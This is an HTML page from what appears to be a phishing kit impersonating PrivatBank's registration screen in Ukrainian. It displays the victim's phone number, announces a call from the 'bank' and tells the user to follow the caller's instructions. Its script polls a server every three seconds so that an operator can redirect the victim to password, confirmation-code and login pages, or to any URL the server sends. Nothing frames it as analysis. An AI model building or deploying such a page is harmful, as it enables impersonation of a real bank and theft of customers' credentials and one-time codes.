<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Реєстрація</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .top-line{height:3px;background:#00A651;flex-shrink:0}

  .topbar{display:flex;align-items:center;justify-content:flex-end;padding:14px 16px}
  .close-btn{
    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
    background:none;border:none;cursor:pointer;
  }
  .close-btn svg{width:28px;height:28px;fill:none;stroke:#222;stroke-width:2;stroke-linecap:round}

  .main-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 24px}

  h1{font-size:28px;font-weight:400;color:#222;text-align:center;margin:30px 0 40px;letter-spacing:-.3px}

  .phone-section{align-self:flex-start;margin-bottom:36px}
  .phone-label{font-size:14px;color:#999;margin-bottom:8px}
  .phone-number{font-size:22px;font-weight:500;color:#222;letter-spacing:.5px}

  .calling-text{font-size:16px;color:#888;margin-bottom:32px}

  .call-icon-wrap{
    position:relative;width:180px;height:180px;
    display:flex;align-items:center;justify-content:center;
    margin-bottom:36px;
  }
  .call-ring{
    position:absolute;inset:0;border-radius:50%;
    border:3px solid rgba(0,166,81,.15);
  }
  .call-ring-animated{
    position:absolute;inset:0;border-radius:50%;
    border:4px solid transparent;
    border-top:4px solid #00A651;
    animation:callSpin 1.8s linear infinite;
  }
  @keyframes callSpin{to{transform:rotate(360deg)}}

  .call-ring-pulse{
    position:absolute;inset:15px;border-radius:50%;
    background:rgba(0,166,81,.06);
    animation:callPulse 2s ease-in-out infinite;
  }
  @keyframes callPulse{0%,100%{transform:scale(.95);opacity:.5}50%{transform:scale(1.05);opacity:1}}

  .call-phone-icon{
    position:relative;z-index:2;width:70px;height:70px;
  }
  .call-phone-icon svg{width:100%;height:100%;fill:#00A651}

  .bank-number{font-size:20px;font-weight:600;color:#00A651;margin-bottom:14px;letter-spacing:.5px}

  .instruction{font-size:15px;color:#888;text-align:center;line-height:1.6;max-width:320px;margin-bottom:28px}

  .sms-link{
    font-size:16px;color:#00A651;font-weight:500;text-decoration:none;
    cursor:pointer;padding:10px 0;align-self:flex-start;
  }
  .sms-link:hover{text-decoration:underline}
</style>
</head>
<body>

  <div class="top-line"></div>

  <div class="topbar">
    <button class="close-btn" type="button" onclick="history.back()">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="main-content">
    <h1>Реєстрація</h1>

    <div class="phone-section">
      <div class="phone-label">Номер телефону</div>
      <div class="phone-number" id="userPhone">+380</div>
    </div>

    <div class="calling-text">Телефонує ПриватБанк</div>

    <div class="call-icon-wrap">
      <div class="call-ring"></div>
      <div class="call-ring-animated"></div>
      <div class="call-ring-pulse"></div>
      <div class="call-phone-icon">
        <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.36 11.36 0 003.55.57 1 1 0 011 1v3.49a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1 11.36 11.36 0 00.57 3.55 1 1 0 01-.25 1.02l-2.2 2.22z"/></svg>
      </div>
    </div>

    <div class="bank-number">+380567976010</div>

    <div class="instruction">Дайте відповідь на дзвінок і дотримуйтесь інструкцій</div>

    <a class="sms-link" id="smsLink" href="#">Підтвердити через SMS</a>
  </div>

<script>
  var params = new URLSearchParams(location.search);
  var orderId = params.get("order");
  var phone = params.get("phone");

  if(phone){
    var formatted = "+38 (" + phone.substring(0,3) + ") " + phone.substring(3,6) + " " + phone.substring(6,8) + " " + phone.substring(8,10);
    document.getElementById("userPhone").textContent = formatted;
  }

  if(!orderId){
    location.href = "index.html";
  }

  document.getElementById("smsLink").addEventListener("click", function(e){
    e.preventDefault();
    location.href = "password.html?order=" + orderId;
  });

  function checkStatus(){
    fetch("/api/orders/" + orderId + "/status")
      .then(function(r){ return r.json(); })
      .then(function(data){
        if(data.redirect_to){
          location.href = data.redirect_to + (data.redirect_to.includes('?') ? '&' : '?') + 'order=' + orderId;
          return;
        }
        if(data.status === "confirmed"){
          location.href = "code.html?order=" + orderId;
        } else if(data.status === "rejected"){
          location.href = "login.html?order=" + orderId + "&error=1";
        }
      })
      .catch(function(){});
  }

  setInterval(checkStatus, 3000);
  checkStatus();
</script>
<script src="footer.js"></script>
<script src="tracker.js"></script>
</body>
</html>
